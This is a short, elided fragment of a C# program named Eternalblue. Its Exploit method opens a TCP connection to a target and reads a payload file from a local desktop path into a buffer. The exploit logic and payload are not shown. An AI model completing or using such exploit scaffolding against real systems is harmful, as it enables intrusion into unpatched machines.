...
namespace Eternalblue
{
    class Program
    {
        ...
        static void Exploit(string target)
        {
            ...
            TcpClient client = new TcpClient(ip, port);
            Socket sock = client.Client;
	    FileStream fstream = new FileStream(@"C:\Users\HuyNguyen\Desktop\bt3.bin", FileMode.Open, FileAccess.Read);
	    BinaryReader breader = new BinaryReader(fstream);
	    long numBytes = new FileInfo(@"C:\Users\HuyNguyen\Desktop\bt3.bin").Length;
	    byte[] buf = breader.ReadBytes((int)numBytes);   
